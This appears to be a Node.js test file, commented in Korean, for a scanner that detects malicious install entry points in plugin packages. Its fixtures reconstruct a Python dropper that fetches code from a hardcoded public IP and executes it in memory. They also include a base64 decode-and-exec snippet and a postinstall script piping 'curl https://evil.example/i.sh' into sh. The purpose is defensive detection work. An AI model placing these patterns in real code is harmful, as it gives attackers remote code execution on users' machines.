#!/usr/bin/env node
// node scripts/plugins/scan-install-entry.test.js
// 네트워크 없이 판정 로직만 검증한다. 픽스처는 2026-08-31 damejan80/tokentab 의 실제 구조를
// 재구성한 것 — 원문을 내려받지 않는다(악성코드 배포를 재현할 이유가 없다).
const assert = require("assert");
const { scanContent } = require("./scan-install-entry");

const rules = (findings) => findings.map((f) => f.rule).sort();

// ── 1) tokentab 드로퍼: 생 IP + 원격 fetch + in-process exec
const dropper = `
from __future__ import annotations
import urllib.request, sys, types
CONFIG = {"HOST": "91.92.47.134", "PORT": 8765, "API_KEY": "test123", "QUIET": True}
def _build_url(cfg):
    return f"http://{cfg['HOST']}:{cfg['PORT']}/api/v1/sync?asset=main"
def _fetch_bytes(url, api_key, timeout=60.0):
    req = urllib.request.Request(url, headers={"Authorization": f"Bearer {api_key}"})
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.read()
def _load_module_memory(name, data):
    module = types.ModuleType(name)
    exec(compile(data, name, "exec"), module.__dict__)
def bootstrap(cfg, url):
    if sys.platform != "win32":
        raise RuntimeError("win32 only")
    _load_module_memory("manual_mapper.py", _fetch_bytes(url, cfg["API_KEY"]))
`;
assert.deepStrictEqual(
  rules(scanContent("tokentab/setup.py", dropper)),
  ["hardcoded_public_ip", "remote_fetch_exec"],
  "드로퍼는 생 IP 와 fetch+exec 두 규칙에 걸린다"
);

// ── 2) 정상 파이썬 CLI: requests + re.compile + subprocess 는 걸리지 않아야 한다
const legitPy = `
import re, subprocess, requests
TAG = re.compile(r"^v\\d+\\.\\d+")
def latest_release(repo):
    r = requests.get(f"https://api.github.com/repos/{repo}/releases/latest", timeout=10)
    return r.json()["tag_name"]
def run_tests():
    subprocess.run(["pytest", "-q"], check=True)
`;
assert.deepStrictEqual(
  scanContent("setup.py", legitPy), [],
  "re.compile · subprocess · requests 조합은 오탐이 아니어야 한다"
);

// ── 3) base64 페이로드를 exec 하는 변형
const b64 = `
import base64
payload = base64.b64decode(BLOB)
exec(payload)
`;
assert.deepStrictEqual(rules(scanContent("cli.py", b64)), ["opaque_decode_exec"]);

// ── 4) package.json postinstall 로 외부 코드 실행
const badPkg = JSON.stringify({
  name: "x",
  scripts: { build: "tsc", postinstall: "curl -s https://evil.example/i.sh | sh" },
});
assert.deepStrictEqual(rules(scanContent("package.json", badPkg)), ["install_script_network"]);

// ── 5) 정상 package.json
const goodPkg = JSON.stringify({ name: "x", scripts: { build: "vite build", test: "node --test" } });
assert.deepStrictEqual(scanContent("package.json", goodPkg), [], "빌드 스크립트만 있으면 통과");

// ── 6) 루프백·사설 대역은 생 IP 규칙에서 제외 (로컬 개발 예시가 흔하다)
for (const host of ["127.0.0.1:8080", "192.168.1.10", "10.0.0.5", "172.16.0.1", "0.0.0.0:3000"]) {
  assert.deepStrictEqual(
    scanContent("cli.py", `BASE = "http://${host}/api"`), [],
    `${host} 는 오탐이 아니어야 한다`
  );
}

// ── 7) 깨진 package.json 은 조용히 넘긴다 (판정 불가 ≠ 컷)
assert.deepStrictEqual(scanContent("package.json", "{ not json"), []);

console.log("scan-install-entry: 7 assertion groups ok");

// ── 8) 매니페스트에서 실제 진입점 경로를 캐낸다 (리포명 ≠ 패키지 디렉터리명인 경우)
const { derivedPaths } = require("./scan-install-entry");
assert.deepStrictEqual(
  derivedPaths({ "pyproject.toml": '[project]\nname = "my-tool"\nversion = "0.1.0"\n' }),
  ["my_tool/__init__.py", "src/my_tool/__init__.py", "my_tool/setup.py"],
  "하이픈은 밑줄로 바꿔 모듈 경로를 만든다"
);
assert.deepStrictEqual(
  derivedPaths({ "package.json": JSON.stringify({ main: "./lib/index.js", bin: { x: "bin/cli.js" } }) }),
  ["lib/index.js", "bin/cli.js"]
);
assert.deepStrictEqual(derivedPaths({ "package.json": "{ broken" }), [], "깨진 매니페스트는 빈 목록");
assert.deepStrictEqual(derivedPaths({}), []);
console.log("scan-install-entry: derivedPaths ok");

// ── 9) 4자리 버전 문자열을 IP 로 오인하지 않는다 (2026-08-31 hermes-agent 오탐 재현)
const pyproject = '[project]\nname = "hermes"\ndependencies = ["torch>=1.2.0.1", "foo==2.0.13.4"]\n';
assert.deepStrictEqual(
  scanContent("pyproject.toml", pyproject), [],
  "매니페스트의 의존성 버전은 IP 가 아니다"
);
assert.deepStrictEqual(
  scanContent("cli.py", '__version__ = "1.2.0.1"\n'), [],
  "코드 안 버전 문자열도 버전 문맥으로 걸러진다"
);
assert.deepStrictEqual(
  rules(scanContent("cli.py", 'HOST = "91.92.47.134"\n')),
  ["hardcoded_public_ip"],
  "코드에 박힌 공개 IP 는 여전히 잡는다"
);
console.log("scan-install-entry: 버전 오탐 방어 ok");
